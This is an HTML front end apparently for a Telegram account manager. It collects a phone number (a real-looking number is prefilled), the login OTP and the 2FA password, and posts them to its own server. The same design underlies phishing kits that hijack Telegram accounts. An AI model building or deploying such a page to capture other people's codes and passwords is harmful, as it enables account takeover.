<!DOCTYPE html>
<html>
<head>
    <title>Telegram Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background: #0088cc; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .container { background: white; max-width: 400px; width: 100%; padding: 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
        h1 { color: #0088cc; text-align: center; margin-bottom: 20px; }
        .info { background: #e3f2fd; padding: 15px; border-radius: 8px; margin-bottom: 20px; font-size: 14px; }
        input { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 8px; font-size: 16px; margin-bottom: 15px; }
        button { width: 100%; padding: 14px; background: #0088cc; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; }
        button:hover { background: #006699; }
        .code-inputs { display: flex; gap: 10px; justify-content: center; margin: 20px 0; }
        .code-input { width: 50px; height: 60px; text-align: center; font-size: 24px; border: 2px solid #ddd; border-radius: 8px; }
        #message { margin-top: 15px; padding: 10px; border-radius: 5px; display: none; }
        .error { background: #ffebee; color: #c62828; }
        .success { background: #e8f5e9; color: #2e7d32; }
    </style>
</head>
<body>
    <div class="container">
        <h1>📱 Telegram Manager</h1>
        
        <div class="info">
            <strong>🔐 REAL OTP</strong><br>
            • Telegram will send SMS/call to your phone<br>
            • Enter the 5-digit code you receive
        </div>

        <div id="message"></div>

        <!-- Step 1: Phone Number -->
        <div id="step1">
            <input type="text" id="phone" placeholder="Phone number (e.g., +971522503474)" value="+971522503474">
            <button onclick="sendOTP()">📲 Send OTP</button>
        </div>

        <!-- Step 2: OTP Code -->
        <div id="step2" style="display:none;">
            <p style="text-align:center; margin-bottom:10px;">Enter the 5-digit code from your phone</p>
            <p style="text-align:center; font-weight:bold; color:#0088cc;" id="displayPhone"></p>
            
            <div class="code-inputs">
                <input type="text" class="code-input" id="code1" maxlength="1" onkeyup="moveToNext(1)">
                <input type="text" class="code-input" id="code2" maxlength="1" onkeyup="moveToNext(2)">
                <input type="text" class="code-input" id="code3" maxlength="1" onkeyup="moveToNext(3)">
                <input type="text" class="code-input" id="code4" maxlength="1" onkeyup="moveToNext(4)">
                <input type="text" class="code-input" id="code5" maxlength="1" onkeyup="moveToNext(5)">
            </div>

            <div id="passwordField" style="display:none; margin-top:10px;">
                <input type="password" id="password" placeholder="2FA Password">
            </div>

            <button onclick="verifyOTP()">✓ Verify</button>
            <button onclick="backToStep1()" style="background:#666; margin-top:5px;">← Back</button>
        </div>
    </div>

    <script>
        let sessionId = '';
        let currentPhone = '';

        function showMessage(text, type) {
            const msg = document.getElementById('message');
            msg.innerHTML = text;
            msg.className = type;
            msg.style.display = 'block';
        }

        async function sendOTP() {
            const phone = document.getElementById('phone').value;
            if (!phone) {
                showMessage('Please enter phone number', 'error');
                return;
            }
            
            currentPhone = phone;
            showMessage('Sending OTP...', 'success');
            
            try {
                const response = await fetch('/api/send-otp', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({phone})
                });
                
                const data = await response.json();
                
                if (data.success) {
                    sessionId = data.sessionId;
                    document.getElementById('displayPhone').innerHTML = phone;
                    document.getElementById('step1').style.display = 'none';
                    document.getElementById('step2').style.display = 'block';
                    showMessage('✅ OTP sent! Check your phone', 'success');
                    
                    // Clear code inputs
                    for (let i = 1; i <= 5; i++) {
                        document.getElementById(`code${i}`).value = '';
                    }
                    document.getElementById('code1').focus();
                } else {
                    showMessage('Error: ' + data.error, 'error');
                }
            } catch (err) {
                showMessage('Network error. Is server running?', 'error');
            }
        }

        function moveToNext(current) {
            const currentInput = document.getElementById(`code${current}`);
            
            if (currentInput.value.length === 1) {
                if (current < 5) {
                    document.getElementById(`code${current + 1}`).focus();
                } else {
                    // Auto-verify when last digit is entered
                    verifyOTP();
                }
            }
        }

        async function verifyOTP() {
            const code = 
                document.getElementById('code1').value +
                document.getElementById('code2').value +
                document.getElementById('code3').value +
                document.getElementById('code4').value +
                document.getElementById('code5').value;
            
            const password = document.getElementById('password').value;

            if (code.length !== 5) {
                showMessage('Please enter the 5-digit code', 'error');
                return;
            }

            showMessage('Verifying...', 'success');

            try {
                const response = await fetch('/api/verify-otp', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({code, password, sessionId})
                });
                
                const data = await response.json();
                
                if (data.success) {
                    showMessage('✅ Login successful! Redirecting...', 'success');
                    setTimeout(() => {
                        window.location.href = '/dashboard';
                    }, 1500);
                } else if (data.twoFactorRequired) {
                    document.getElementById('passwordField').style.display = 'block';
                    showMessage('2FA required - enter your password', 'success');
                } else {
                    showMessage('Error: ' + data.error, 'error');
                }
            } catch (err) {
                showMessage('Verification failed', 'error');
            }
        }

        function backToStep1() {
            document.getElementById('step1').style.display = 'block';
            document.getElementById('step2').style.display = 'none';
            document.getElementById('passwordField').style.display = 'none';
            document.getElementById('message').style.display = 'none';
        }
    </script>
</body>
    </html>
